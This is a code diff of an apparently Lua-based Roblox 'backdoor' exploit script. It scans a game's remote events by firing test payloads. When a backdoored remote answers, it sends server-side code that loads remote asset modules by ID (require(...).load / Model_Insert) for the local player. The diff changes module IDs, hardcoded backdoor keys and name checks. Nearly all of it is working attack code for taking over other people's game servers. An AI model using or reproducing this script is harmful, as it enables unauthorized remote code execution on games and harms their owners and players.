@@ -439,14 +439,14 @@ function attach()
 		Duration = 5;
 	})
 	if settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:IsA("Frame") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Pages") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("R6") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Version") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Title") then
-		settings.BackdoorRemote:FireServer("5#lGIERKWEF","require(7230908200).load("..'"'..game:GetService("Players").LocalPlayer.Name..'"'..")")
+		settings.BackdoorRemote:FireServer("5#lGIERKWEF","require(0x2be7f9811).load("..'"'..game:GetService("Players").LocalPlayer.Name..'"'..")")
 	end
 	if settings.BackdoorRemote.Name == "emma" and settings.BackdoorRemote.Parent.Name == "mynameemma" then
 		--local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
 		--settings.BackdoorRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
 	end
 	if settings.BackdoorRemote.Name ~="emma" and settings.BackdoorRemote.Parent.Name~="mynameemma" and AntiAdonis == false or settings.BackdoorRemote.Name ~="emma" and settings.BackdoorRemote.Parent.Name~="mynameemma" and AntiAdonis == true and not settings.BackdoorRemote:FindFirstChild("__FUNCTION") then
-		settings.BackdoorRemote:FireServer([[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
+		settings.BackdoorRemote:FireServer([[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
 	end
 end
 function attach2()
@@ -456,7 +456,7 @@ function attach2()
 		Text = "Found: "..settings.BackdoorRemote:GetFullName();
 		Duration = 5;
 	})
-	settings.BackdoorRemote:InvokeServer([[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
+	settings.BackdoorRemote:InvokeServer([[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
 end
 
 function stringToInstance(str) -- Credits to the DevForum
@@ -524,7 +524,7 @@ function scan()
 			local TEST_SCRIPT = "a=Instance.new('StringValue',workspace) a.Name='"..VALUE_NAME.."' a.Value='"..testRemote:GetFullName().."'"
 			if testRemote.Name == "Run" and testRemote.Parent:IsA("Frame") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Pages") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("R6") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Version") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Title") then
 				testRemote:FireServer("5#lGIERKWEF",TEST_SCRIPT)
-			elseif testRemote.Name ~="emma" and testRemote.Parent.Name~="mynameemma" and AntiAdonis == false or testRemote.Name ~="emma" and testRemote.Parent.Name~="mynameemma" and AntiAdonis == true and not testRemote:FindFirstChild("__FUNCTION") then
+			elseif testRemote.Name ~="ndhl2if" and testRemote.Parent.Name~="ndhl2if" and AntiAdonis == false or testRemote.Name ~="ndhl2if" and testRemote.Parent.Name~="ndhl2if" and AntiAdonis == true and not testRemote:FindFirstChild("__FUNCTION") then
 				testRemote:FireServer(TEST_SCRIPT)
 			end
 			game:GetService("RunService").Stepped:Wait()
@@ -532,15 +532,15 @@ function scan()
 			if check(VALUE_NAME) then
 				attach()
 				return
-			elseif testRemote.Name == "emma" and testRemote.Parent.Name == "mynameemma" then
-				local code = [[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
+			elseif testRemote.Name == "ndhl2if" and testRemote.Parent.Name == "ndhl2if" then
+				local code = [[require(8837986469).Model_Insert(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
 				testRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
                                 game:GetService("RunService").Stepped:Wait()
                                   game:GetService("RunService").Stepped:Wait()
                                     game:GetService("RunService").Stepped:Wait()
                                     game:GetService("RunService").Stepped:Wait()
 				if check(VALUE_NAME) then
-					local code = [[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
+					local code = [[require(8837986469).Model_Insert(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
 					testRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
                                         attach()
 					return
@@ -551,7 +551,7 @@ function scan()
                                     game:GetService("RunService").Stepped:Wait()
                                     game:GetService("RunService").Stepped:Wait()
 				if check(VALUE_NAME) then
-					local code = [[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
+					local code = [[require(8837986469).Model_Insert(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
 					testRemote:FireServer('helpme',code)
 					attach()
 					return
@@ -563,7 +563,7 @@ function scan()
                                     game:GetService("RunService").Stepped:Wait()
 				if check(VALUE_NAME) then
 					print("Testing cGlja2V0dA==")
-					local code = [[require(0x2be7f9811).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
+					local code = [[require(8837986469).Model_Insert(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
 					testRemote:FireServer('cGlja2V0dA==',code)
 					attach()
 					return
